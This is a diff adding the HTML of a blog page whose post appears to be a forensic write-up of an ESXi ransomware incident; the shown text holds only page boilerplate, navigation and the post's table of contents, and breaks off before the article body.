@@ -1,0 +1,3073 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My thoughts, projects and etc.">
+      
+      
+      
+        <link rel="canonical" href="https://zhymabekroman.github.io/posts/esxi-ransomware-without-esxi-ransomware/">
+      
+      
+        <link rel="prev" href="../ui-design_the-bad-and-the-good/">
+      
+      
+        <link rel="next" href="../message-from-sts.gov.kz/">
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.9">
+    
+    
+      
+        <title>Encrypting an ESXi estate without ever running code on ESXi - Zhymabek Roman's blog site</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.4af4bdda.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../css/custom-headers.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  <style>#pop-definition {
+	display: none;
+}
+
+.annotation-container {
+	padding: 0 2px;
+	border-radius: 3px;
+	position: relative;
+	cursor: pointer;
+	display: inline-block;
+	background-color: hsla(60, 75%, 90%, 0.5);
+}
+
+/* Dark theme support */
+[data-md-color-scheme="slate"] .annotation-container {
+	background-color: hsla(60, 75%, 20%, 0.5);
+}
+
+.annotation-container .popover {
+	display: none;
+	position: absolute;
+	border: 1px solid var(--md-default-fg-color--lighter, #ccc);
+	padding: 8px;
+	border-radius: 4px;
+	box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+	width: 200px;
+	left: 50%;
+	transform: translateX(-50%);
+	top: calc(100% + 5px);
+	z-index: 1000;
+	font-size: 0.9em;
+	background-color: var(--md-default-bg-color, white);
+	color: var(--md-default-fg-color, black);
+}
+
+/* Show popover on hover for desktop */
+@media (hover: hover) {
+	.popover,
+	.popovers-container {
+		display: block;
+	}
+}
+
+/* Show popover on tap for mobile */
+.annotation-container.active .popover,
+.annotation-container.active .popovers-container {
+	display: block;
+}
+
+.popovers-container {
+	display: none;
+	position: absolute;
+	left: 50%;
+	transform: translateX(-50%);
+	top: calc(100% + 5px);
+	z-index: 1000;
+}
+
+.popovers-container .popover {
+	position: relative;
+	display: block;
+	margin-bottom: 5px;
+	left: 0;
+	transform: none;
+	top: 0;
+}
+
+/* Position popover above text if too close to bottom of viewport */
+.annotation-container .popover.above {
+	top: auto;
+	bottom: calc(100% + 5px);
+}
+
+/* Arrow indicators */
+.annotation-container .popover::before {
+	content: "";
+	position: absolute;
+	left: 50%;
+	transform: translateX(-50%);
+	border: 8px solid transparent;
+	border-bottom-color: #ccc;
+	top: -16px;
+}
+
+.annotation-container .popover::after {
+	content: "";
+	position: absolute;
+	left: 50%;
+	transform: translateX(-50%);
+	border: 7px solid transparent;
+	border-bottom-color: white;
+	top: -14px;
+}
+
+.annotation-container .popover.above::before {
+	border-top-color: #ccc;
+	border-bottom-color: transparent;
+	top: auto;
+	bottom: -16px;
+}
+
+.annotation-container .popover.above::after {
+	border-top-color: white;
+	border-bottom-color: transparent;
+	top: auto;
+	bottom: -14px;
+}
+
+/* Dark theme arrow indicators */
+[data-md-color-scheme="slate"] .annotation-container .popover::before {
+	border-bottom-color: var(--md-default-fg-color--lighter, #ccc);
+}
+
+[data-md-color-scheme="slate"] .annotation-container .popover::after {
+	border-bottom-color: var(--md-default-bg-color, #2e303e);
+}
+
+[data-md-color-scheme="slate"] .annotation-container .popover.above::before {
+	border-top-color: var(--md-default-fg-color--lighter, #ccc);
+	border-bottom-color: transparent;
+}
+
+[data-md-color-scheme="slate"] .annotation-container .popover.above::after {
+	border-top-color: var(--md-default-bg-color, #2e303e);
+	border-bottom-color: transparent;
+}
+</style><script>document.addEventListener("DOMContentLoaded", () => {
+	const containers = document.querySelectorAll(".annotation-container");
+
+	containers.forEach((container) => {
+		const annotations = container.getAttribute("data-annotations");
+		if (!annotations) return;
+
+		// Create popovers container
+		const popoversContainer = document.createElement("div");
+		popoversContainer.className = "popovers-container";
+
+		// Create individual popovers (deduplicate references)
+		const uniqueAnnotations = [...new Set(annotations.split("|"))];
+		uniqueAnnotations.forEach((annotation) => {
+			const popover = document.createElement("div");
+			popover.className = "popover";
+
+			if (annotation.startsWith("#")) {
+				const popoverId = annotation.substring(1);
+				const externalPopover = document.getElementById(popoverId);
+				if (externalPopover) {
+					// Clone the content instead of the entire element
+					const content =
+						externalPopover.innerHTML || externalPopover.textContent;
+					popover.innerHTML = content;
+				} else {
+					console.warn(`Reference not found: ${popoverId}`);
+					popover.textContent = annotation; // Show original annotation text instead of error
+				}
+			} else {
+				popover.textContent = annotation;
+			}
+
+			popoversContainer.appendChild(popover);
+		});
+
+		// Remove any existing popovers container
+		const existingContainer = container.querySelector(".popovers-container");
+		if (existingContainer) {
+			existingContainer.remove();
+		}
+
+		container.appendChild(popoversContainer);
+
+		// Add visual indicator
+		container.style.borderBottom = "1px dotted #999";
+	});
+
+	// Handle click events for mobile devices
+	containers.forEach((container) => {
+		container.addEventListener("click", (e) => {
+			// Close all other popovers
+			document.querySelectorAll(".annotation-container").forEach((c) => {
+				if (c !== container) {
+					c.classList.remove("active");
+				}
+			});
+
+			container.classList.toggle("active");
+			e.stopPropagation();
+		});
+	});
+
+	// Close popovers when clicking outside
+	document.addEventListener("click", () => {
+		document.querySelectorAll(".annotation-container").forEach((c) => {
+			c.classList.remove("active");
+		});
+	});
+
+	// Handle theme changes
+	const observer = new MutationObserver((mutations) => {
+		mutations.forEach((mutation) => {
+			if (mutation.attributeName === "data-md-color-scheme") {
+				updatePopoversPosition();
+			}
+		});
+	});
+
+	// Start observing theme changes
+	const htmlElement = document.documentElement;
+	observer.observe(htmlElement, {
+		attributes: true,
+		attributeFilter: ["data-md-color-scheme"],
+	});
+
+	function updatePopoversPosition() {
+		document.querySelectorAll(".annotation-container").forEach((container) => {
+			const popover = container.querySelector(".popover, .popovers-container");
+			if (!popover) return;
+
+			// Check if popover would go off screen
+			const rect = popover.getBoundingClientRect();
+			const viewportHeight = window.innerHeight;
+
+			if (rect.bottom > viewportHeight) {
+				popover.classList.add("above");
+			} else {
+				popover.classList.remove("above");
+			}
+		});
+	}
+
+	// Initial position update
+	updatePopoversPosition();
+
+	// Update positions on scroll and resize
+	window.addEventListener("scroll", updatePopoversPosition);
+	window.addEventListener("resize", updatePopoversPosition);
+});
+</script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="violet">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1-the-environment-in-the-abstract" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Zhymabek Roman&#39;s blog site" class="md-header__button md-logo" aria-label="Zhymabek Roman's blog site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Zhymabek Roman's blog site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Encrypting an ESXi estate without ever running code on ESXi
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="violet"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="violet" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ZhymabekRoman/zhymabekroman.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ZhymabekRoman.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../my-portable-pc-build.md" class="md-tabs__link">
+          
+  
+    
+  
+  Posts
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Zhymabek Roman&#39;s blog site" class="md-nav__button md-logo" aria-label="Zhymabek Roman's blog site" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Zhymabek Roman's blog site
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ZhymabekRoman/zhymabekroman.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ZhymabekRoman.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Posts
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Posts
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Tech
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Tech
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../my-portable-pc-build.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    None
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../must-have-applications/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    List of the essential applications that you need to have
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../must-have-browser-extensions/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Must have browser extensions
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Development & Design
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Development & Design
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../whatsapp-api/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Leverage Whatsapp like your own API!
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../custom-telegram-client-api-credits/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Custom Telegram client API credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../transcribe-trial-reset/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reset the trial version of Transcribe! on Linux (and maybe MacOS)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ui-design_the-bad-and-the-good/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    UI design - the bad and the good
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Security/Pentest
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Security/Pentest
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Encrypting an ESXi estate without ever running code on ESXi
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Encrypting an ESXi estate without ever running code on ESXi
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-the-environment-in-the-abstract" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. The environment, in the abstract
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-the-technique-sshfs-win-as-a-ransomware-transport" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. The technique: SSHFS-Win as a ransomware transport
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. The technique: SSHFS-Win as a ransomware transport">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-what-the-hypervisors-saw" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 What the hypervisors saw
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-the-prerequisites-were-mundane" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 The prerequisites were mundane
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-it-broke-and-the-breakage-is-visible-in-the-ciphertext" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3 It broke, and the breakage is visible in the ciphertext
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-mitigations-this-specifically-argues-for" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.4 Mitigations this specifically argues for
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25-attribution-fingerprint" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.5 Attribution fingerprint
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-toolkit-121-files-in-three-two-letter-folders" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. The toolkit: 121 files in three two-letter folders
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. The toolkit: 121 files in three two-letter folders">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-mi-credential-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 mi\ — credential dumping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-ns-scanning-persistence-remote-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2 ns\ — scanning, persistence, remote access
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.2 ns\ — scanning, persistence, remote access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-one-bespoke-component" class="md-nav__link">
+    <span class="md-ellipsis">
+      The one bespoke component
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-e-the-loader" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.3 e\ — the loader
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-the-seventeen-hour-shift" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. The seventeen-hour shift
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. The seventeen-hour shift">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-two-encryptors-not-one" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1 Two encryptors, not one
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-the-exfiltration-shaped-hole" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2 The exfiltration-shaped hole
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-persistence-two-ifeo-hijacks-with-two-different-jobs" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Persistence: two IFEO hijacks with two different jobs
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-anti-forensics-seven-scripts-in-76-milliseconds" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Anti-forensics: seven scripts in 76 milliseconds
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Anti-forensics: seven scripts in 76 milliseconds">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-timestomping-and-the-artefact-that-defeats-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.1 Timestomping, and the artefact that defeats it
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-the-payload-85-mib-of-ciphertext-against-2187-tb" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. The payload: 85 MiB of ciphertext against 21.87 TB
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. The payload: 85 MiB of ciphertext against 21.87 TB">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71-what-25-mib-at-each-end-actually-destroys" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.1 What 2.5 MiB at each end actually destroys
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72-why-97-came-back-anyway" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.2 Why 97 % came back anyway
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73-the-trailer" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.3 The trailer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#74-the-second-recovery-frontier-every-small-file-is-half-plaintext" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.4 The second recovery frontier: every small file is half plaintext
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#75-measuring-a-cipher-you-do-not-have" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.5 Measuring a cipher you do not have
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-two-claims-that-did-not-survive-the-evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. Two claims that did not survive the evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Two claims that did not survive the evidence">
+      <ul class="md-nav__list">
+        
